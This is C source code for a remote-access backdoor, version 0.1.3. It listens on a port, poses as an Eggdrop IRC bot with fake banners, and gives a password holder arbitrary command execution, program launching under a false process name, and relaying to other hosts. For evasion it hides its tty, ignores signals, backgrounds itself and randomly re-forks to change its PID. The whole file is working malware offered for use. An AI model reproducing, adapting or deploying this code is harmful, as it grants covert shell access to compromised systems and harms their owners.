/*
	Defineovi:

	DONT_HIDE_TTY
	SUNOS
	DEBIAN
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <arpa/telnet.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <netdb.h>
#ifdef SUNOS
#include <sys/errno.h>
#endif
#ifdef DEBIAN
#include <asm/errno.h>
#endif
/* Za communicate() */
#include <sys/time.h>

#define VER "0.1.3"
#define PROMPT "bouncer>"
#define TMP_STR_SIZE 256
#define ARGS 16
#define CLIENTS 16
#define PROMPT_NICK " "
#define PORT_ENV "bport"
#define PASS_ENV "bpass"
#define BPRINT_ENV "bprint"
#define DEBUG_ENV "bdebug"
#define NICK_ENV "bnick"

int MainSock;
unsigned int SockAddrSize, Clients = 0;
unsigned long int ForkPoint;
char Pass[32], Nick[16],
	Response[][64] = {
		"0 Ready.",
		"1 Command not implemented.",
		"2 Operation successfull.",
		"3 Opeation not succesfull."
		};

void DisconnectClient (int ClientSock)
	{
	shutdown (ClientSock, 2);
	close (ClientSock);
	exit (EXIT_SUCCESS);
	}

void NoEchoMode (int ClientSock)
	{
	char Str[5];

	printf ("%c%c%c", IAC, WILL, TELOPT_ECHO);
	fgets (Str, 4, stdin);
	}

void EchoMode (int ClientSock)
	{
	char Str[5];

	printf ("%c%c%c", IAC, WONT, TELOPT_ECHO);
	fgets (Str, 4, stdin);
	}

void BinMode (int ClientSock)
	{
	char Str[5];

	printf ("%c%c%c", IAC, DO, TELOPT_BINARY);
	fgets (Str, 4, stdin);
	}

char *Gets (char *Str, unsigned int Size)
	{
	if (fgets (Str, Size, stdin) == NULL)
		return (NULL);
	Str[strlen (Str) - 1] = 0;
	return (Str);
	}

void Parse (int *Args, char **Arg)
	{
	int Num;

	if (!Arg[0][0])
		return;

	for (Num = 0; Num < ARGS; Num ++)
		{
		if (Num)
			{
			Arg[Num] = strchr (Arg[Num - 1], ' ');
			if (Arg[Num] == NULL)
				break;
			}
	
		while (*Arg[Num] == ' ')
			{
			*Arg[Num] = 0;
			Arg[Num] ++;
			}
		}
	*Args = Num;
	}

void communicate(int sfd,int cfd)    {
    char *chead, *ctail, *shead, *stail;
    int num, nfd, spos, cpos;
    extern int errno;
    fd_set rd, wr;
	char cbuf[2048], sbuf[2048];

    chead = ctail = cbuf;
    cpos = 0;
    shead = stail = sbuf;
    spos = 0;
    while (1) {
        FD_ZERO(&rd);
        FD_ZERO(&wr);
        if (spos < sizeof(sbuf)-1) FD_SET(sfd, &rd);
        if (ctail > chead) FD_SET(sfd, &wr);
        if (cpos < sizeof(cbuf)-1) FD_SET(cfd, &rd);
        if (stail > shead) FD_SET(cfd, &wr);
        nfd = select(256, &rd, &wr, 0, 0);
        if (nfd <= 0) continue;
        if (FD_ISSET(sfd, &rd)) {
            num=read(sfd,stail,sizeof(sbuf)-spos);
            if ((num==-1) && (errno != EWOULDBLOCK)) return;
            if (num==0) return;
            if (num>0) {
                spos += num;
                stail += num;
                if (!--nfd) continue;
            }
        }
        if (FD_ISSET(cfd, &rd)) {
            num=read(cfd,ctail,sizeof(cbuf)-cpos);
            if ((num==-1) && (errno != EWOULDBLOCK)) return;
            if (num==0) return;
            if (num>0) {
                cpos += num;
                ctail += num;
                if (!--nfd) continue;
            }
        }
        if (FD_ISSET(sfd, &wr)) {
            num=write(sfd,chead,ctail-chead);
            if ((num==-1) && (errno != EWOULDBLOCK)) return;
            if (num>0) {
                chead += num;
                if (chead == ctail) {
                    chead = ctail = cbuf;
                    cpos = 0;
                }
                if (!--nfd) continue;
            }
        }
        if (FD_ISSET(cfd, &wr)) {
            num=write(cfd,shead,stail-shead);
            if ((num==-1) && (errno != EWOULDBLOCK)) return;
            if (num>0) {
                shead += num;
                if (shead == stail) {
                    shead = stail = sbuf;
                    spos = 0;
                }
                if (!--nfd) continue;
            }
        }
    }
}

void Connect (int ClientSock, char *Host, char *PortStr)
	{
	int ConnectSock, Res;
	unsigned int Port;
	struct hostent *HostEnt;
	struct sockaddr_in SockAddr;

	HostEnt = gethostbyname (Host);
	if (HostEnt == NULL)
		{
		printf ("%s: Unknown host.\n", Host);
		return;
		}
	Port = (unsigned int)strtoul (PortStr, NULL, 10);
	if (!Port && PortStr[0])
		{
		printf ("%s: Bad port number.\n", PortStr);
		return;
		}

	SockAddr.sin_family = AF_INET;
	SockAddr.sin_addr = *(struct in_addr *)HostEnt->h_addr;	
	SockAddr.sin_port = htons (Port);

	printf ("Trying %d.%d.%d.%d...\n",
		(HostEnt->h_addr_list[0][0] < 0) ? HostEnt->h_addr_list[0][0] + 256 : HostEnt->h_addr_list[0][0],
		(HostEnt->h_addr_list[0][1] < 0) ? HostEnt->h_addr_list[0][1] + 256 : HostEnt->h_addr_list[0][1],
		(HostEnt->h_addr_list[0][2] < 0) ? HostEnt->h_addr_list[0][2] + 256 : HostEnt->h_addr_list[0][2],
		(HostEnt->h_addr_list[0][3] < 0) ? HostEnt->h_addr_list[0][3] + 256 : HostEnt->h_addr_list[0][3]);
	ConnectSock = socket (AF_INET, SOCK_STREAM, 0);
	if (ConnectSock == -1)
		{
		printf ("Can't create a socket!\n");
		return;
		}
	Res = connect (ConnectSock, (struct sockaddr *)&SockAddr, SockAddrSize);
	if (Res == -1)
		{
		printf ("Can't connect to remote host: ");
		perror ("");
		return;
		}
	printf ("Connected to %s.\n", Host);
	communicate (ConnectSock, ClientSock);
	close (ConnectSock);
	printf ("\n\rconnect: Connection closed.\n\r");
	DisconnectClient (ClientSock);
	}

void ServeClient (int ClientSock)
	{
	int Args, InPromptMode = 0;
	char Str[TMP_STR_SIZE], *Arg[ARGS], Str2[TMP_STR_SIZE];

	int IsCmd (char *Command)
		{
		if (strcmp (Command, Arg[0]))
			return (0);
		return (1);
		}

	signal (SIGCHLD, SIG_DFL);

	dup2 (ClientSock, 0);
	dup2 (ClientSock, 1);
	dup2 (ClientSock, 2);
	setvbuf (stdout, NULL, _IONBF, 0);
	setvbuf (stdout, NULL, _IONBF, 1);
	setvbuf (stdout, NULL, _IONBF, 2);
	BinMode (ClientSock);

	printf ("\n\n%s (Eggdrop v1.3.12  (c)1997 Robey Pointer)\n\nPlease enter your nickname.\n", Nick);
	if (Gets (Str, TMP_STR_SIZE) == NULL)
		DisconnectClient (ClientSock);
	if (!strcmp (Str, Pass))
		goto Ready;
	InPromptMode = 1;
	if (strcmp (Str, PROMPT_NICK))
		{
		printf ("You don't have access.\n");
		DisconnectClient (ClientSock);
		}

	printf ("Enter your password.\n");
	NoEchoMode (ClientSock);
	if (Gets (Str, TMP_STR_SIZE) == NULL)
		DisconnectClient (ClientSock);
	EchoMode (ClientSock);
	if (strcmp (Str, Pass))
		{
		printf ("\rNegative on that, Houston.\n");
		DisconnectClient (ClientSock);
		}

	Ready:
	if (InPromptMode)
		printf ("Version: %s\nWhat do you want to hack today?\n", VER);
	else
		puts (Response[0]);

	Str[0] = 0;
	do
		{
		Arg[0] = Str;
		strcpy (Str2, Str);
		Parse (&Args, Arg);
		if (IsCmd (""))
			goto CmdDone;
		if (!InPromptMode)
			{
			puts (Response[1]);
			goto Again;
			}
		if (IsCmd ("quit") || IsCmd ("exit"))
			DisconnectClient (ClientSock);
		if (IsCmd ("exec"))
			{
			if (Args < 3)
				{
				printf ("exec: Not enough parameters.\nType '?' for help.\n");
				goto CmdDone;
				}
			if (!fork ())
				{
				execl (Arg[2], Arg[1],
					Arg[3], Arg[4], Arg[5],
					Arg[6], Arg[7], Arg[8],
					Arg[9], Arg[10], Arg[11],
					Arg[12], Arg[13], Arg[14],
					Arg[15],
					NULL);
				perror (Arg[0]);
				exit (EXIT_FAILURE);
				}
			wait (0);
			goto CmdDone;
			}
		if (IsCmd ("sys"))
			{
			if (Args < 2)
				{
				printf ("sys: Not enough parameters.\nType '?' for help.\n");
				goto CmdDone;
				}
			system (Str2 + (Arg[1] - Str));
			goto CmdDone;
			}
		if (IsCmd ("help") || IsCmd ("?"))
			{
			printf ("%s%s%s%s%s%s%s%s%s",
				"\n",
				"con\t<host> [port]\n",
				"exec\t<false name> <program> [arguments]\n",
				"exit\n",
				"help\n",
				"sys\t<command> [arguments]\n",
				"quit\n",
				"?\n",
				"\n");
			goto CmdDone;
			}
		if (IsCmd ("connect"))
			{
			if (Args < 2)
				{
				printf ("connect: Not enough parameters.\nType '?' for help.\n");
				goto CmdDone;
				}
			if (Args == 2)
				Connect (ClientSock, Arg[1], "23");
			else
				Connect (ClientSock, Arg[1], Arg[2]);
			goto CmdDone;
			}
		printf ("%s: Command not found.\nType '?' for help.\n", Arg[0]);
		CmdDone:
		if (InPromptMode)
			printf ("%s", PROMPT);
		Again:
		}
	while (Gets (Str, TMP_STR_SIZE) != NULL);

	DisconnectClient (ClientSock);
	}

void HandleSigMain (int Sig)
	{
	wait (0);
	Clients --;
	signal (Sig, HandleSigMain);
	}

int main (void)
	{
	int Num, ClientSock, EnvErr, DoPrint = 0;
	unsigned int Port;
	pid_t Pid;
	struct sockaddr_in SockAddr;

	SockAddrSize = sizeof (SockAddr);
	ForkPoint = (unsigned long int)(RAND_MAX / 1000); /* 0,1% sanse */

	if (getenv (BPRINT_ENV))
		DoPrint = 1;

	if (DoPrint)
		printf ("Version: %s\n", VER);
	else
		printf ("%s%s%s", 
			"Eggdrop v1.3.14  (c)1997 Robey Pointer\n",
			"--- Loading eggdrop v1.3.14 (Tue Jun 30 1998)\n",
			"* CONFIG FILE NOT LOADED (NOT FOUND, OR ERROR)\n"
			);

	EnvErr = 0;
	if (!getenv (PORT_ENV))
		{
		if (DoPrint)
			fprintf (stderr, "Fatal error: Port variable '%s' not set.\n", PORT_ENV);
		EnvErr = 1;
		}
	if (!getenv (PASS_ENV))
		{
		if (DoPrint)
			fprintf (stderr, "Fatal error: Password variable '%s' not set.\n", PASS_ENV);
		EnvErr = 1;
		}
	if (!getenv (NICK_ENV))
		{
		if (DoPrint)
			fprintf (stderr, "Fatal error: Nick variable '%s' not set.\n", NICK_ENV);
		EnvErr = 1;
		}
	if (EnvErr)
		exit (EXIT_FAILURE);

	Port = strtoul (getenv (PORT_ENV), NULL, 10);
	strncpy (Pass, getenv (PASS_ENV), 32);
	if (!strcmp (Pass, PROMPT_NICK) && DoPrint)
		{
		fprintf (stderr, "Fatal error: Password is equal to prompt nick.\n");
		exit (EXIT_FAILURE);
		}
	strncpy (Nick, getenv (NICK_ENV), 16);

#ifndef DONT_HIDE_TTY
	if (ioctl (0, TIOCNOTTY) == -1 && DoPrint)
		fprintf (stderr, "Non-fatal error: Unable to hide tty.\n");
#endif

	if (!getenv (DEBUG_ENV))
		{
		printf ("Changing signal handling...\n");
		for (Num = 0; Num < 256; Num ++)
			signal (Num, SIG_IGN);
		}
	else
		printf ("Skiping signal handling change.\n");
	signal (SIGCHLD, HandleSigMain);

	MainSock = socket (AF_INET, SOCK_STREAM, 0);
	if (MainSock == -1)
		{
		fprintf (stderr, "Fatal error: Unable to create main socket.\n");
		exit (EXIT_FAILURE);
		}
	SockAddr.sin_family = AF_INET;
	SockAddr.sin_addr.s_addr = 0;
	SockAddr.sin_port = htons (Port);
	if (bind (MainSock, (struct sockaddr *)&SockAddr, sizeof (SockAddr)))
		{
		fprintf (stderr, "Fatal error: Unable to open port %d: ", Port);
		perror ("");
		exit (EXIT_FAILURE);
		}
	if (listen (MainSock, CLIENTS))
		{
		perror ("Fatal error: Can't assign port for listening");
		exit (EXIT_FAILURE);
		}
	printf ("Listening on port %u.\n", Port);
	fcntl (MainSock, F_SETFL, fcntl (MainSock, F_GETFL) | O_NONBLOCK);

	if ((Pid = fork ()))
		{
		printf (
#ifdef SUNOS
			"Moving into the background with PID %lu.\n",
#else
			"Moving into the background with PID %u.\n",
#endif
			Pid);
		exit (EXIT_SUCCESS);
		}

	while (1)
		{
		ClientSock = accept (MainSock, (struct sockaddr *)&SockAddr, &SockAddrSize);
		if (ClientSock != -1)
			{
			Clients ++;
			if (!fork ())
				ServeClient (ClientSock);
			}
				
		srand (time (NULL));
		if (rand () < ForkPoint && !Clients)
			{
			if (fork ())
				exit (0);
			}
		usleep (10000);
		}	
	}
